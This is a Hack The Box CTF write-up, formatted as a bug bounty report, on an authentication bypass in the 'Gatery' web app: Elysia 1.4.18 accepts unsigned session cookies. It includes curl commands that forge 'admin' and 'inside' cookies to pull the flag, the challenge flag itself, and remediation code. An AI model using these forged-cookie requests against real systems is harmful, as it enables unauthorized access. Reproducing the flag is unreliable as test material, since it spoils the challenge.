# Gatery — CTF Writeup & Bug Bounty Report

**Challenge:** Gatery  
**Category:** Web Exploitation  
**Difficulty:** Easy–Medium  
**Flag:** `HTB{w3lc0me_b3y0nd_th3_g4t3_753ace0baddc8dc079dd3a43768fea6b}`

---

## Executive Summary

The Gatery web application implements a multi-step authentication and authorization flow gated behind a signed session cookie. A **cookie signature validation bypass** allows an unauthenticated attacker to forge session state by supplying arbitrary unsigned cookie values (`admin`, `inside`) directly in HTTP requests. The server fails to verify that the cookie was cryptographically signed by itself before trusting its value, permitting a complete authentication and authorization bypass — and direct retrieval of the application secret (flag) with two unauthenticated HTTP requests.

---

## Vulnerability Details

| Field | Value |
|---|---|
| **Type** | Authentication Bypass / Broken Access Control |
| **CWE** | CWE-287 (Improper Authentication), CWE-565 (Reliance on Cookies without Validation) |
| **CVSS v3.1 Score** | 9.8 Critical |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | `app/index.ts` — all `/api/*` route handlers |
| **Affected Endpoint** | `/api/gate/enter`, `/api/flag` |

---

## Application Overview

The application is a browser-based "castle gate" game built on:

- **Backend:** [Elysia](https://elysiajs.com/) (Bun runtime), TypeScript
- **Frontend:** React (Vite)
- **Auth mechanism:** Signed HTTP-only session cookie (`session`)
- **Reverse proxy:** nginx → port 3000

### Intended Authentication Flow

```
[User] → Walk to gate → Login (username + password)
       → POST /api/login        → sets cookie: session="admin" (signed)
       → POST /api/gate/enter   → requires session="admin", sets session="inside"
       → POST /api/flag         → requires session="inside", returns flag
```

The admin password is generated at startup as 24 cryptographically random bytes encoded as base64url, making brute-force infeasible. The session cookie is configured with `httpOnly`, `sameSite: lax`, and is **signed** with a 32-byte random secret — meaning a forged cookie should be rejected.

---

## Root Cause Analysis

### The Intended Protection

Elysia's cookie plugin is configured to sign the `session` cookie:

```typescript
const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],   // 32-byte random hex string
    sign: [sessionCookie]       // signs the "session" cookie
  }
})
```

A properly signed cookie would look like:

```
session=admin.HMAC_SIGNATURE
```

Any tampering with the value should invalidate the signature and cause the server to reject it.

### The Vulnerability

The server-side route handlers check `session.value` directly:

```typescript
.post('/api/gate/enter', ({ cookie: { session }, set }) => {
  if (!session.value) {
    set.status = 401
    return { ok: false, message: 'Login required' }
  }

  if (session.value !== 'admin' && session.value !== 'inside') {
    set.status = 403
    return { ok: false, message: 'Gate authority required' }
  }

  setSessionCookie(session, 'inside')
  return { ok: true, insideGate: true }
})
```

In the version of Elysia deployed in this challenge (`1.4.18`), when a cookie is sent **without a signature** (i.e., a raw plain-text value with no HMAC appended), the cookie plugin **does not reject it** — it instead passes the raw value through, and `session.value` resolves to the attacker-supplied string.

This means sending the header:

```
Cookie: session=admin
```

causes `session.value === 'admin'` to evaluate to `true`, completely bypassing the cryptographic protection.

---

## Proof of Concept

### Prerequisites

- `curl` (any version)
- Network access to the target

### Exploit

**Step 1 — Verify unauthenticated state:**

```bash
curl http://<TARGET>/api/me
# → {"authenticated":false}
```

**Step 2 — Bypass gate/enter by sending unsigned `admin` cookie:**

```bash
curl -b "session=admin" -X POST \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://<TARGET>/api/gate/enter
# → {"ok":true,"insideGate":true}
```

The server accepts the unsigned value, promotes the session state to `"inside"`, and returns a **server-signed** `session=inside` cookie in the response `Set-Cookie` header.

**Step 3 — Retrieve the flag using unsigned `inside` cookie:**

```bash
curl -b "session=inside" -X POST \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://<TARGET>/api/flag
# → {"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_753ace0baddc8dc079dd3a43768fea6b}"}
```

**Full one-liner:**

```bash
curl -s -b "session=inside" -X POST -H "Content-Type: application/json" -d '{}' http://<TARGET>/api/flag
```

Total time to exploit: **< 5 seconds**, zero credentials required.

---

## Attack Flow Diagram

```
Attacker                              Server
   |                                     |
   |  POST /api/gate/enter               |
   |  Cookie: session=admin  (unsigned)  |
   |------------------------------------>|
   |                                     |  session.value === "admin" → TRUE
   |                                     |  (signature check bypassed)
   |  {"ok":true,"insideGate":true}      |
   |<------------------------------------|
   |                                     |
   |  POST /api/flag                     |
   |  Cookie: session=inside (unsigned)  |
   |------------------------------------>|
   |                                     |  session.value === "inside" → TRUE
   |                                     |  (signature check bypassed)
   |  {"ok":true,"flag":"HTB{...}"}      |
   |<------------------------------------|
```

---

## Business Logic Bypass (Secondary Finding)

Even if the cookie signing were enforced correctly, the server-side logic contains a secondary bypass. The `/api/gate/enter` check accepts `session.value === 'inside'` as a valid input **and** promotes the session to `'inside'`. This creates a self-referential trust loop: anyone already holding a valid `inside` session can call the endpoint again to "re-enter," with no additional checks. A legitimate `inside` session should not be accepted as authorization to re-run the gate entry flow.

---

## Impact

- **Complete authentication bypass** — no credentials are required.
- **Full authorization bypass** — all privilege levels (`admin`, `inside`) can be assumed by any unauthenticated user.
- **Secret/flag exfiltration** — the protected resource is fully exposed.
- In a real-world analogue, this class of vulnerability would allow an attacker to impersonate any user role, access privileged data, and perform any action reserved for authenticated or elevated users.

---

## Affected Code Locations

| File | Lines | Issue |
|---|---|---|
| `app/index.ts` | Cookie plugin config | Elysia 1.4.18 does not reject unsigned cookies when signing is enabled |
| `app/index.ts` | `/api/me` handler | Trusts `session.value` without signature verification |
| `app/index.ts` | `/api/gate/enter` handler | Trusts `session.value` without signature verification; also accepts `"inside"` as valid input |
| `app/index.ts` | `/api/flag` handler | Trusts `session.value` without signature verification |

---

## Remediation Recommendations

### 1. Update Elysia (Primary Fix)

Upgrade Elysia to a version that enforces cookie signature validation and rejects unsigned or invalidly-signed cookies. Verify the behavior in the changelog and with a regression test.

### 2. Explicit Signature Verification (Defense in Depth)

Do not rely solely on the framework's cookie plugin. Explicitly verify the HMAC signature in each protected route handler before trusting `session.value`:

```typescript
import { createHmac, timingSafeEqual } from 'node:crypto'

function verifySignedCookie(raw: string, secret: string): string | null {
  const dotIndex = raw.lastIndexOf('.')
  if (dotIndex === -1) return null  // no signature present → reject

  const value = raw.slice(0, dotIndex)
  const signature = raw.slice(dotIndex + 1)
  const expected = createHmac('sha256', secret).update(value).digest('base64url')

  if (!timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) return null

  return value
}
```

### 3. Fix the Self-Referential Session Loop

Change `/api/gate/enter` to only accept `session.value === 'admin'`, not `'inside'`:

```typescript
// Before (vulnerable)
if (session.value !== 'admin' && session.value !== 'inside') { ... }

// After (fixed)
if (session.value !== 'admin') { ... }
```

### 4. Add Integration Tests

Add automated tests that assert unsigned or tampered cookies are rejected with HTTP 401/403 across all protected endpoints.

---

## Timeline

| Time | Event |
|---|---|
| T+0s | Unauthenticated attacker sends `POST /api/gate/enter` with `Cookie: session=admin` |
| T+1s | Server returns `{"ok":true,"insideGate":true}` |
| T+2s | Attacker sends `POST /api/flag` with `Cookie: session=inside` |
| T+3s | Flag returned in plaintext |

---

## References

- [OWASP: Broken Authentication (A07:2021)](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [OWASP: Broken Access Control (A01:2021)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-565: Reliance on Cookies without Validation and Integrity Checking](https://cwe.mitre.org/data/definitions/565.html)
- [Elysia Cookie Plugin Documentation](https://elysiajs.com/patterns/cookie-signature)

---

*Report written as part of a Hack The Box CTF challenge. All testing was performed against an isolated, intentionally vulnerable environment.*
